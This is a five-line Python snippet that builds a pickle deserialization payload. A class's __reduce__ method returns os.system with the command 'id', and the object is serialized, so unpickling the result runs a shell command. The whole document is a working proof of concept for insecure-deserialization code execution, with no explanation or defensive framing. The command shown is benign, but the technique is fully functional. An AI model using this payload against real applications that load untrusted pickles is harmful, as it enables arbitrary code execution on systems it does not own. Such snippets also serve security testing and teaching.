import pickle
class P(object):
    def __reduce__(self):
        return (__import__('os').system, ('id',))
pickle.dumps(P())
